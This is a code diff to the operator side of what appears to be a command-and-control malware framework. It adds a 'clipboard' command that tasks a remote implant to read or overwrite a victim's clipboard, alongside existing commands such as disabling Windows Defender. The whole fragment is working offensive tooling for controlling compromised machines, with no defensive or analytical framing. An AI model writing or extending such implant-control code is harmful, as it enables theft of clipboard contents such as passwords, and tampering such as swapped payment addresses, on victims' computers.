@@ -97,6 +97,8 @@ def handle(
         handle_whoami(config, implant_id)
     elif cmd == "disable_defender":
         handle_disable_defender(config, implant_id)
+    elif cmd == "clipboard":
+        handle_clipboard(config, implant_id, args)
     elif cmd == "back":
         return True
     elif cmd == "clear":
@@ -438,3 +440,27 @@ def handle_disable_defender(config: OperatorConfig, implant_id: str) -> None:
     """
     logger.debug(f"Sending disable_defender task to {implant_id}")
     add_task(config, Opcodes.DISABLE_DEFENDER.value, implant_id, None)
+
+def handle_clipboard(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
+    """
+    Handle the clipboard command
+    """
+    if len(args) < 1:
+        logger.error("Please provide an action to perform")
+        return
+
+    action = args[0]
+    if action == "get":
+        logger.debug(f"Sending clipboard_get task to {implant_id}")
+        add_task(config, Opcodes.CLIPBOARD_GET.value, implant_id, None)
+    elif action == "set":
+        if len(args) < 2:
+            logger.error("Please provide text to set the clipboard to")
+            return
+
+        text = args[1]
+        logger.debug(f"Sending clipboard_set task to {implant_id}")
+        add_task(config, Opcodes.CLIPBOARD_SET.value, implant_id, text)
+    else:
+        logger.error(f"Invalid action {action}")
+        return
